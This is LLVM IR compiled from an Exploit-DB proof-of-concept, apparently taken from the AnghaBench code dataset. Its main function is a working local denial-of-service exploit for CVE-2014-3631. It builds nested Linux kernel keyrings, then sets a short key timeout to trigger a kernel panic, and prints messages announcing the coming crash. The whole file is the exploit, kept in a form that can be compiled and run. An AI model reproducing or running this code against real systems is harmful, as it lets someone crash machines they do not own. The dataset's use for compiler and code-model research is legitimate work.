; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_36268.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_36268.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [40 x i8] c"[cve_2014_3631]: Preparing to exploit.\0A\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"/proc/sys/kernel/keys/gc_delay\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [101 x i8] c"[cve_2014_3631 error]: Could not open /proc/sys/kernel/keys/gc_delay, assuming delay is 5 minutes. \0A\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"keyring\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"Lvl1K\00", align 1
@KEY_SPEC_USER_KEYRING = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [39 x i8] c"[cve_2014_3631 error]: keyring  fault\0A\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"add_key\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"Lvl2K_\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"[cve_2014_3631]:  Exploit!\0A\00", align 1
@.str.10 = private unnamed_addr constant [72 x i8] c"[cve_2014_3631]: Exploit triggered, system will panic in  %d seconds..\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [16 x i8], align 16
  %7 = alloca [16 x i8], align 16
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %9 = bitcast [16 x i8]* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 16, i1 false)
  %10 = bitcast [16 x i8]* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %10, i8 0, i64 16, i1 false)
  store i32 0, i32* %8, align 4
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @O_RDONLY, align 4
  %13 = call i32 @open(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0), i32 %12)
  store i32 %13, i32* %5, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp eq i32 %14, -1
  br i1 %15, label %16, label %18

16:                                               ; preds = %0
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.2, i64 0, i64 0))
  store i32 300, i32* %8, align 4
  br label %26

18:                                               ; preds = %0
  %19 = load i32, i32* %5, align 4
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %21 = call i32 @read(i32 %19, i8* %20, i32 8)
  %22 = getelementptr inbounds [16 x i8], [16 x i8]* %7, i64 0, i64 0
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %8, align 4
  %24 = load i32, i32* %5, align 4
  %25 = call i32 @close(i32 %24)
  br label %26

26:                                               ; preds = %18, %16
  %27 = load i32, i32* @KEY_SPEC_USER_KEYRING, align 4
  %28 = call i32 @add_key(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i32* null, i32 0, i32 %27)
  store i32 %28, i32* %3, align 4
  %29 = load i32, i32* %3, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %34

31:                                               ; preds = %26
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  %33 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %68

34:                                               ; preds = %26
  store i32 0, i32* %4, align 4
  br label %35

35:                                               ; preds = %59, %34
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %36, 18
  br i1 %37, label %38, label %62

38:                                               ; preds = %35
  %39 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %40 = call i32 @memset(i8* %39, i32 0, i32 16)
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %42 = call i32 @strlen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %43 = call i32 @memcpy(i8* %41, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i32 %42)
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %45 = call i32 @strlen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i32, i32* %4, align 4
  %49 = call i32 @sprintf(i8* %47, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i32 %48)
  %50 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %51 = load i32, i32* %3, align 4
  %52 = call i32 @add_key(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* %50, i32* null, i32 0, i32 %51)
  store i32 %52, i32* %2, align 4
  %53 = load i32, i32* %2, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %58

55:                                               ; preds = %38
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  %57 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %68

58:                                               ; preds = %38
  br label %59

59:                                               ; preds = %58
  %60 = load i32, i32* %4, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %4, align 4
  br label %35

62:                                               ; preds = %35
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0))
  %64 = load i32, i32* %2, align 4
  %65 = call i32 @keyctl_set_timeout(i32 %64, i32 2)
  %66 = load i32, i32* %8, align 4
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.10, i64 0, i64 0), i32 %66)
  store i32 0, i32* %1, align 4
  br label %68

68:                                               ; preds = %62, %55, %31
  %69 = load i32, i32* %1, align 4
  ret i32 %69
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @add_key(i8*, i8*, i32*, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i32) #2

declare dso_local i32 @keyctl_set_timeout(i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
